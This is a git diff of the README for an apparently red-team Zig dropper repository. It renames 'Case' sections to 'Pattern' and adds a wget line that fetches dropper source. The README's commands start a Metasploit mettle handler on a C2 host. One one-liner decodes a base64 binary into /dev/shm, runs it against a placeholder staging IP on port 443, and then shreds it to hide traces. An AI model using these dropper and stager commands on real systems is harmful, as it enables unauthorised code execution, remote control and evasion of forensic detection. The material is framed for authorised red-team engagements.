@@ -2,7 +2,7 @@
 
 ## Purpose
 
-This repository contains the collection of
+This repository contains the collection of code execution building blocks and patterns useful during red team engagements.
 
 ## Backend (basic version)
 
@@ -28,7 +28,13 @@ EOF
 c2$ msfconsole -r mettle-handler.rc
 ```
 
-## Case 1
+## Pattern 0
+
+```
+wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case0.zig
+```
+
+## Pattern 1
 
 Assumptions:
 
@@ -62,7 +68,7 @@ EXE=z-dropper-case1; zig build-exe -OReleaseSmall --strip ${EXE}.zig; echo; cat 
 echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
 ```
 
-## Case 2
+## Pattern 2
 
 Assumptions:
 
